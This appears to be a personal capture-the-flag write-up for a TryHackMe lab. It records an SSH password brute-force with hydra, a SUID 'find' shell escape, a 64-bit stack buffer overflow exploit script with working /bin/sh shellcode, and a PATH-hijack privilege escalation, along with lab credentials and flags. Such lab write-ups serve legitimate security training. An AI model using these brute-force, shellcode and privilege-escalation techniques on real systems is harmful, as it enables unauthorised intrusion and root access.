# binex 

> VOiD | Saturday 07 August 2021 01:08:53 PM IST

My IP : 10.17.6.109
Target IP : 10.10.123.44

# PORT SMB
we have users
```bash
S-1-22-1-1000 Unix User\kel (Local User)
S-1-22-1-1001 Unix User\des (Local User)
S-1-22-1-1002 Unix User\tryhackme (Local User)
S-1-22-1-1003 Unix User\noentry (Local User)


```


```bash
hydra -l tryhackme -P /usr/share/wordlists/rockyou.txt ssh://10.10.123.44 -V -t 50  255 
[22][ssh] host: 10.10.123.44   login: tryhackme   password: thebest

tryhackme:thebest
```

# PORT 22
```bash
-rwsr-sr-x 1 des    des             233K Nov  5  2017 /usr/bin/find

/usr/bin/find . -exec /bin/sh -p \; -quit

cat flag.txt
Good job on exploiting the SUID file. Never assign +s to any system executable files. Remember, Check gtfobins.

You flag is THM{exploit_the_SUID}

login crdential (In case you need it)
username: des
password: destructive_72656275696c64

```
# Hint
```bash
Hint 1: Step to overflow 64-bits buffer

Step 1: Generate a pattern, copy and paste this as input to the binary (use pattern_create.rb from
Metasploit)
Step 2: Read and copy the value from register RBP for the offset.
Step 3: Calculate the offset. (use pattern_offset.rb from Metasploit)
Step 4: Try control the register RIP with the following payload
Junk*(offset value) + 8 bytes of dummy
Step 5: Read the stack or register RSP to find a suitable return address.
Step 6: The general payload should be like below
Nop + shellcode + Junks + return address


Working shellcode : \x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05
```

```bash
RBP : 0x4134754133754132

/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 0x4134754133754132
[*] Exact match at offset 608

RSP : 0x7fffffffe4a0
```

Exploit
```py
#!/usr/bin/python
from struct import pack


#rip="\x66"*6+"\x00"*2
rip=pack("<Q", 0x7fffffffe310)

NOPS="\x90"*400

shellcode='\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05' #24 chars
padding = (216-len(shellcode))*"A"
exploit = NOPS + shellcode + padding  + rip

print exploit


```

```

(cat aa.txt;cat) | ./buf
cat flag.txt
You flag is THM{buffer_overflow_in_64_bit}

The user credential
username: kel
password: kelvin_74656d7065726174757265

```

exe.c
```c
#include <unistd.h>

void main()
{
	setuid(0);
	setgid(0);
	system("ps");
}

```
```bash

export PATH=$PATH:/tmp
./exe
cat root.txt 
The flag: THM{SUID_binary_and_PATH_exploit}. 
Also, thank you for your participation.

The room is built with love. DesKel out.

```


